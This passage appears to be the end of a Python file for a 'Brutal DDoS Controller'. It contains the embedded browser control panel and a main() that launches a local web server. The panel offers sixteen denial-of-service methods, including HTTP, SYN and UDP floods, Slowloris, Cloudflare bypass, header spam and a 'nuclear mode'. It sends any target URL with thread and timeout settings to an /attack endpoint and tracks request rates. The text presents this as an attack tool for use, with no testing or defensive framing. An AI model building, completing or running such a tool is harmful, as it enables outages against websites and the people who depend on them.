            <div class="logs" id="logs"></div>
        </div>
    </div>
    
    <script>
        const methods = [
            {{ id: 'http', name: 'HTTP FLOOD', desc: 'High-volume HTTP/1.1 requests with randomized headers' }},
            {{ id: 'https', name: 'HTTPS FLOOD', desc: 'SSL/TLS encrypted flood with session reuse' }},
            {{ id: 'slowloris', name: 'SLOWLORIS', desc: 'Connection exhaustion via slow headers (low bandwidth)' }},
            {{ id: 'tcp', name: 'TCP SYN', desc: 'SYN packet flood - target network layer' }},
            {{ id: 'udp', name: 'UDP FLOOD', desc: 'Volumetric UDP attack with random payloads' }},
            {{ id: 'cache', name: 'CACHE BYPASS', desc: 'CDN/Cloudflare evasion with random query strings' }},
            {{ id: 'cf', name: 'CLOUDFLARE BYPASS', desc: 'Special headers to bypass CF protection' }},
            {{ id: 'referer', name: 'REFERER SPAM', desc: 'Random referer headers to confuse logs' }},
            {{ id: 'range', name: 'RANGE SPAM', desc: 'HTTP Range header flood' }},
            {{ id: 'method', name: 'METHOD SPAM', desc: 'Random HTTP methods (GET/POST/PUT/DELETE/etc)' }},
            {{ id: 'cookie', name: 'COOKIE SPAM', desc: 'Massive cookie injection' }},
            {{ id: 'gzip', name: 'GZIP BOMB', desc: 'Accept-Encoding: gzip abuse' }},
            {{ id: 'keepalive', name: 'KEEP-ALIVE', desc: 'Connection keep-alive exhaustion' }},
            {{ id: 'auth', name: 'AUTH SPAM', desc: 'Random basic auth headers' }},
            {{ id: 'mixed', name: 'MIXED ATTACK', desc: 'Rotate through all layer 7 methods' }},
            {{ id: 'nuclear', name: 'NUCLEAR MODE', desc: 'EVERYTHING COMBINED - MAXIMUM BRUTALITY' }}
        ];

              let selectedMethod = null;
        let updateInterval = null;
        
        function renderMethods() {{
            const container = document.getElementById('methods');
            container.innerHTML = '';
            
            methods.forEach(m => {{
                const div = document.createElement('div');
                div.className = `method ${{selectedMethod === m.id ? 'selected' : ''}}`;
                div.onclick = () => {{
                    selectedMethod = m.id;
                    renderMethods();
                    addLog('Selected: ' + m.name);
                }};
                
                div.innerHTML = `
                    <div class="method-name">${{m.name}}</div>
                    <div class="method-desc">${{m.desc}}</div>
                `;
                
                container.appendChild(div);
            }});
        }}
        
        function addLog(msg) {{
            const logs = document.getElementById('logs');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            const time = new Date().toLocaleTimeString();
            entry.textContent = '[' + time + '] ' + msg;
            logs.appendChild(entry);
            logs.scrollTop = logs.scrollHeight;
            
            while (logs.children.length > 100) {{
                logs.removeChild(logs.firstChild);
            }}
        }}
        
        function startAttack() {{
            if (!selectedMethod) {{
                addLog('Please select attack method');
                return;
            }}
            
            const target = document.getElementById('target').value;
            const threads = document.getElementById('threads').value;
            const timeout = document.getElementById('timeout').value;
            
            if (!target) {{
                addLog('Please enter target URL');
                return;
            }}
            
            if (!target.startsWith('http://') && !target.startsWith('https://')) {{
                addLog('URL must start with http:// or https://');
                return;
            }}
            
            const url = '/attack?method=' + selectedMethod + 
                       '&target=' + encodeURIComponent(target) + 
                       '&threads=' + threads + 
                       '&timeout=' + timeout;
            
            fetch(url)
                .then(r => r.json())
                .then(data => {{
                    addLog(' Attack started: ' + selectedMethod + ' on ' + target);
                    if (!updateInterval) {{
                        updateInterval = setInterval(updateStats, 500);
                    }}
                }})
                .catch(err => {{
                    addLog('Error: ' + err);
                }});
        }}
        
        function stopAttack() {{
            fetch('/stop')
                .then(r => r.json())
                .then(() => {{
                    addLog(' Attack stopped');
                    if (updateInterval) {{
                        clearInterval(updateInterval);
                        updateInterval = null;
                    }}
                    document.getElementById('progress').style.width = '0%';
                }});
        }}
        
        function updateStats() {{
            fetch('/stats')
                .then(r => r.json())
                .then(stats => {{
                    document.getElementById('total').textContent = stats.total.toLocaleString();
                    document.getElementById('success').textContent = stats.success.toLocaleString();
                    document.getElementById('failed').textContent = stats.failed.toLocaleString();
                    
                    let rps = 0;
                    if (stats.elapsed > 0) {{
                        rps = Math.floor(stats.total / stats.elapsed);
                    }}
                    document.getElementById('rps').textContent = rps.toLocaleString();
                    
                    let progress = Math.min(100, (stats.total / 100000) * 100);
                    document.getElementById('progress').style.width = progress + '%';
                }})
                .catch(err => {{
                    console.log('Stats error:', err);
                }});
        }}
        
        renderMethods();
        addLog('Brutal DDoS Controller ready - Select target and method');
    </script>
</body>
</html>
"""
    
    def log_message(self, format, *args):
        pass

# ============================================================
# MAIN
# ============================================================
def main():
    PORT = 8080
    
    print("=" * 60)
    print("  BRUTAL DDoS CONTROLLER - 20+ ATTACK METHODS")
    print("  Created by s3cret_proj3ct")
    print("=" * 60)
    print(f"  Server: http://localhost:{PORT}")
    print("  Press Ctrl+C to stop")
    print("=" * 60)
    
    # Open browser
    webbrowser.open(f'http://localhost:{PORT}')
    
    # Start server
    server = HTTPServer(('', PORT), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\nServer stopped")
        server.shutdown()

if __name__ == "__main__":
    main()
